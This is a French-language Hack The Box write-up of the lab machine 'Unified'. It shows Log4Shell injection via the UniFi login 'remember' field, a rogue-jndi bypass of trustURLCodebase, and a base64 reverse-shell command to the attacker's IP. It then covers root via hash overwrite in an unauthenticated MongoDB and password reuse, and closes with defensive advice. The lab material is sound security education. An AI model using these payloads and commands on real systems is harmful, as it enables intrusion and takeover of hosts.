# HTB — Unified (Starting Point, Tier 2)

> Dernier verrou du Starting Point, rooté en solo. Deux gros morceaux : un **Log4Shell (CVE-2021-44228)** qui refuse de marcher au premier essai à cause d'une vraie défense Java, puis un **privesc par écriture directe dans MongoDB** (broken access control). Étiquetée « facile » — elle cache pourtant un piège que beaucoup contournent sans comprendre.
>
> Payloads défangés : `ldap[:]//`, IP/ports en placeholders. Remettre de vraies valeurs pour rejouer.

- **Flags :** user + root obtenus (non publiés).
- **IP box :** `<ip>` · **Mon tun0 :** `<tun0>`.
- **Techniques :** Log4Shell / JNDI · contournement `trustURLCodebase` via rogue-jndi (gadget local) · MongoDB sans auth · remplacement de hash `$6$` · réutilisation de mot de passe SSH → root.

---

## 1. Recon
```bash
nmap -sV -sC <ip>
```
Ports qui comptent : 22 (SSH), 6789, 8080, 8443 (interface web UniFi HTTPS), 8843, 8880. C'est un contrôleur UniFi (le logiciel Ubiquiti qui pilote des bornes wifi).

On ouvre `https://<ip>:8443` → page de login UniFi. Réflexe clé : identifier la VERSION (ici UniFi 6.4.54). Cette version précise est vulnérable à Log4Shell (CVE-2021-44228).

---

## 2. Le foothold — Log4Shell de A à Z

### 2.1 La folie du bug, en une phrase
Log4j est une bibliothèque de logs Java. Elle a une « fonctionnalité » démente : si le texte qu'elle enregistre contient `${jndi:ldap[:]//adresse/x}`, elle va CHERCHER et EXÉCUTER le code Java situé à cette adresse. Une lib censée juste écrire des logs qui télécharge et lance du code distant.

**JNDI** (*Java Naming and Directory Interface*) = l'annuaire interne de Java. `${jndi:ldap://...}` lui dit « va chercher un objet sur ce serveur LDAP ». Log4j interpole cette expression avant d'écrire la ligne → il déclenche la requête tout seul.

### 2.2 La chaîne complète (les 4 rebonds)
```
[1] J'injecte   ${jndi:ldap[:]//<MOI>:1389/a}   dans un champ que l'appli LOGGE
        ▼
[2] Log4j (côté box) voit le ${jndi:...} → interroge MON serveur LDAP (port 1389)
        ▼
[3] Mon LDAP répond : « l'objet que tu veux est une classe → va la chercher
                       sur http://<MOI>:8000/Exploit.class »
        ▼
[4] La JVM de la box TÉLÉCHARGE Exploit.class sur mon serveur HTTP, puis l'EXÉCUTE
        → ce code ouvre un reverse shell vers moi
```
Résumé mental : je transforme la victime en livreuse de son propre malware. Elle fait tout le travail.

### 2.3 Ce que `poc.py` (kozmer/log4j-shell-poc) fait réellement
Le script orchestre 3 serveurs d'un coup pendant que l'injection sert d'allumette.

| Il lance… | Rôle dans la chaîne | Détail |
|---|---|---|
| Génère + compile `Exploit.java` | fabrique le rebond [4] | `Exploit.class` = un reverse shell, avec MON IP/port codés dedans. Compilé par un JDK 8 (`jdk1.8.0_20/bin/javac`) → d'où le JDK à télécharger. |
| Serveur HTTP (port 8000) | sert le rebond [4] | Sert `Exploit.class` à qui le demande. |
| Faux LDAP (marshalsec, port 1389) | le rebond [3] | Quand la box l'interroge, il redirige vers `http://<MOI>:8000/Exploit.class`. |

Puis il affiche `[+] Send me: ${jndi:ldap[:]//<MOI>:1389/a}` → c'est CETTE ficelle que j'injecte. Et je dois lancer `nc -lvnp 4444` à part (le script ne fait PAS le listener — le shell revient chez `nc`).

Prérequis silencieux (le code les révèle par ses chemins en dur) :
- `./jdk1.8.0_20/bin/java` → un JDK 8 extrait sous ce nom exact (j'ai pris 8u202 → dossier `jdk1.8.0_202` à renommer en `jdk1.8.0_20`).
- `target/marshalsec-0.0.3-SNAPSHOT-all.jar` → fourni dans le repo GitHub (absent du `.py` de searchsploit → cloner le repo).
- `pip install colorama` (bloqué par Kali/PEP 668 → `sudo apt install python3-colorama`).

```bash
git clone https://github.com/kozmer/log4j-shell-poc && cd log4j-shell-poc
# déposer le JDK 8 ici, renommé jdk1.8.0_20
nc -lvnp 4444          # terminal A — LE FILET, EN PREMIER
python3 poc.py --userip <tun0> --webport 8000 --lport 4444   # terminal B
```
Piège : `--userip` = MON IP (tun0), JAMAIS l'IP de la box. C'est l'adresse où la victime doit me rappeler. Autre piège : le `.py` récupéré via searchsploit peut arriver avec une ligne coupée (URL) → `SyntaxError: unterminated string literal`. Bosser depuis le repo cloné.

### 2.4 Pourquoi ça a échoué — la vraie leçon : `trustURLCodebase`
Symptôme au débogage : le LDAP se faisait bien taper (`Send LDAP reference result ... redirecting to http://<MOI>:8000/Exploit.class`), MAIS aucun `GET /Exploit.class` sur le serveur HTTP, et aucun shell.

Bissection de la chaîne :
- Rebond [2] LDAP → OK (la box me joint sur 1389)
- Rebond [4] HTTP → KO (elle ne vient JAMAIS chercher la classe)
- Or 8000 est joignable (même interface que 1389 qui marche) → ce n'est PAS le réseau.

Diagnostic : la JVM de la box REFUSE de télécharger/exécuter une classe distante. C'est une vraie protection Java :
> `com.sun.jndi.ldap.object.trustURLCodebase = false` — valeur par défaut depuis Java 8u191 (fin 2018, avant même Log4Shell). Elle interdit le chargement de code distant via une référence LDAP.

Le PoC de kozmer repose entièrement sur ce téléchargement de classe (rebond [4]) → il est MORT contre un Java patché. Lecture purple : le défenseur avait patché le tour de magie avant la CVE. Comprendre ce « pourquoi ça rate » vaut dix boxes.

### 2.5 Le contournement — rogue-jndi (gadget local)
L'idée : ne plus faire TÉLÉCHARGER une classe distante (bloqué). À la place, livrer un objet déjà empoisonné, sérialisé, DIRECTEMENT dans la réponse LDAP, qui abuse d'une classe déjà présente sur la cible (un « gadget local », ex. le gadget Tomcat/EL). Aucun code distant → `trustURLCodebase` ne s'applique pas.

```bash
sudo apt install maven -y
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi
mvn package                                   # → target/RogueJndi-1.1.jar

# le reverse shell, encodé base64 pour passer sans souci dans le gadget
echo -n 'bash -i >& /dev/tcp/<tun0>/4444 0>&1' | base64

java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<BASE64>}|{base64,-d}|bash" \
  --hostname "<tun0>"
# démarre son LDAP et liste des URL : ldap://<MOI>:1389/o=tomcat , o=groovy ...
```
Différence clé avec poc.py : rogue-jndi n'a PAS besoin du rebond [4] (le téléchargement HTTP). Le poison part dans la réponse LDAP elle-même (rebond [3]). C'est exactement ce qui manquait.

### 2.6 Le point d'injection — le champ `remember`
La ficelle s'injecte dans la requête de login UniFi. Les champs user/pass sont filtrés ; le champ `remember` (dans le corps JSON de `POST /api/login`) file droit dans les logs → c'est LUI que Log4j lit.

Intercepter le login (Burp ou *Edit & Resend* du navigateur) et remplacer :
```json
{"username":"a","password":"a","remember":"${jndi:ldap[:]//<MOI>:1389/o=tomcat}","strict":true}
```
Renvoyer la requête → le gadget part → shell dans `nc` (si `o=tomcat` ne mord pas, essayer les autres URL listées par rogue-jndi).

---

## 3. Post-exploitation — stabilisation
Shell obtenu en tant que `unifi` (compte de service, uid 999). Pas de `sudo`, pas de `python`/`python3` sur la box.
```bash
# TTY : pas de python → on tente 'script' (souvent présent)
script -qc /bin/bash /dev/null
# (le rituel Ctrl+Z → stty raw -echo ; fg côté Kali reste optionnel)
```
Piège : `stty` s'exécute sur MON Kali (après `Ctrl+Z`), pas dans le shell distant. Et c'est `-echo` avec le tiret. Leçon : le confort TTY n'est pas la mission, un `bash` fonctionnel suffit.

User flag dans `/home/michael/user.txt`.

---

## 4. Privesc — MongoDB sans authentification

### 4.1 Débusquer le port (sans `ss` ni `netstat`)
La box n'a ni `ss` ni `netstat`. Deux voies :
- `/proc/net/tcp` (« tout est fichier » sous Linux — le noyau expose les sockets là, ports en hexadécimal → convertir).
- Les logs (`/usr/lib/unifi/logs/mongod.log`) qui crachent la config en clair : `port=27117`, `db version v3.6.3`, et surtout `WARNING: Access control is not enabled` → lecture ET écriture libres.

Réflexe : quand les outils manquent, les fichiers de log/config fuient la configuration.

### 4.2 Lire les comptes admin
```bash
mongo --port 27117 ace         # 'ace' = la base UniFi (pas 'mongosh' sur cette box)
> show collections             # → admin, setting, device, user...
> db.admin.find().pretty()
```
La collection `admin` = les opérateurs de l'interface web. On y trouve `administrator`, `michael`, etc., chacun avec un champ `x_shadow` = `$6$...`.

### 4.3 Le format du hash — réflexe préfixe `$N$`
| Préfixe | Type |
|---|---|
| `$1$` | md5crypt |
| `$5$` | sha256crypt |
| `$6$` | sha512crypt ← ici (hashcat `-m 1800`, john `sha512crypt`) |
| `$2a$`/`$2y$` | bcrypt |

Le `$6$` est volontairement lent à casser → rockyou ne trouvera pas un mdp admin. Donc on ne CASSE pas.

### 4.4 Le twist — broken access control par écriture
Le warning Mongo l'a dit : j'ai le droit d'écrire. Puisque je ne peux pas lire le mot de passe de l'admin, je remplace son hash par un hash dont MOI je connais le mot de passe en clair :
```bash
mkpasswd -m sha-512 "Password123"     # (ou: openssl passwd -6 "Password123") → un $6$...
```
```javascript
// dans le shell mongo — ATTENTION au champ : c'est "name", PAS "nom" !
db.admin.update({ name: "administrator" }, { $set: { x_shadow: "<MON_HASH_$6$>" } })
// doit répondre : nMatched: 1, nModified: 1
```
Piège : filtre `{ nom: ... }` (en français) → 0 match, aucune erreur, rien écrit. Toujours vérifier `nMatched: 1`.

### 4.5 Web UI → creds SSH → root
Connexion à `https://<ip>:8443` en `administrator` / `Password123` (mon mot de passe). Puis dans Settings → System / Site → Device Authentication (SSH) : un champ mot de passe masqué, révélé par l'icône œil.

Le fil rouge de toute la box : la RÉUTILISATION de mot de passe. Ce mot de passe SSH « pour piloter les appareils » est le même que celui du root de la machine :
```bash
ssh root@<ip>                 # → root@unified
cat /root/root.txt
```

---

## 5. Leçons-clés
- **Un exploit qui rate n'est pas la fin — c'est un indice.** LDAP touché mais pas de GET HTTP + port joignable = signature de `trustURLCodebase=false`. Le débogage par bissection de la chaîne a donné le diagnostic.
- **`trustURLCodebase` (Java ≥ 8u191)** neutralise le Log4Shell « classique » (chargement de classe distante). Parade offensive = gadget LOCAL sérialisé (rogue-jndi / JNDI-Exploit-Kit).
- **`poc.py` = un orchestrateur de 3 serveurs** (Java compilé + HTTP + LDAP), pas de la magie. Lire les chemins en dur d'un exploit = lire sa liste de dépendances.
- **`--userip` / `LHOST` = MON adresse**, jamais la cible.
- **Broken access control par écriture** : une base sans auth ⇒ je ne lis pas le secret, je l'écrase. `$6$` incassable ⇒ le remplacer > le casser.
- **Réutilisation de mot de passe** : creds SSH « appareils » = mot de passe root.
- **Terrain nu** : pas de `ss`/`netstat`/`python` ⇒ `/proc/net/tcp` + les logs pour la config.

---

## 6. Défense (réflexe purple)
- **Corriger Log4j** (≥ 2.17) / retirer `JndiLookup` ; `trustURLCodebase=false` (déjà par défaut) est une défense en profondeur qui a ici bloqué la moitié des attaquants.
- **MongoDB** : activer l'authentification (`--auth`), ne jamais écouter sans contrôle d'accès, moindre privilège applicatif. Le warning `Access control is not enabled` = trou béant.
- **Pas de réutilisation de mot de passe** entre services (UniFi ≠ root système) ; secrets hachés (jamais un `x_ssh_password` récupérable en clair par l'admin d'appli).
- **Compte de service en moindre privilège** (c'est ce qui a limité l'attaquant à un privesc plutôt qu'un root direct — mais MongoDB ouvert annulait le bénéfice).
- **Egress filtering** : un contrôleur wifi n'a aucune raison d'initier des connexions LDAP/HTTP sortantes arbitraires → couper aurait tué la chaîne au rebond [2].
